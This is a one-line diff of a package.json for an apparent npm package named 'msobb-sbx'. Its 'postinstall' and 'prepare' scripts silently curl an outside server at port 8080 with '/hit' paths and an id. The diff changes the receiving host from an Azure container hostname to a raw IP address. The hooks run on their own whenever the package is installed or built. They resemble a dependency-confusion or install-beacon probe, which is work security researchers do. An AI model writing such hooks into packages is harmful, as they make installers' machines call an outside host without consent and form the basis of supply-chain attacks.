@@ -1,1 +1,1 @@
-{ "name":"msobb-sbx","version":"1.0.0","scripts":{"postinstall":"curl -sm10 'http://msobbsbxrecv012fb7.eastus.azurecontainer.io:8080/hit/npm-postinstall?n=012fb7' || true","prepare":"curl -sm10 'http://msobbsbxrecv012fb7.eastus.azurecontainer.io:8080/hit/npm-prepare?n=012fb7' || true"} }
+{ "name":"msobb-sbx","version":"1.0.0","scripts":{"postinstall":"curl -sm10 'http://4.157.142.157:8080/hit/npm-postinstall?n=012fb7' || true","prepare":"curl -sm10 'http://4.157.142.157:8080/hit/npm-prepare?n=012fb7' || true"} }
